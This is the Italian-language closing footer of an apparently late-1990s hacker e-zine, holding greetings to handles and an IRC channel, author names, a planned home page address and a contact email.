T0rment0, \think\, lordguf e tutti quelli di #alby00

[----------------------------Home Page---------------------------------------]
[             http://x-brain.cjb.net ----> Sara' attiva presto               ]
[----------------------------E-zine------------------------------------------]
[              Techno Knight, T0rment0, \think\ e Und3rk00l                  ]
[----------------------------------------------------------------------------]
[  Per collaborare, criticare, domandare e tutto il resto, l'email e'        ]
[                           x-brain@iname.com                                ]
[----------------------------------------------------------------------------]
[-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#EOF#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#]
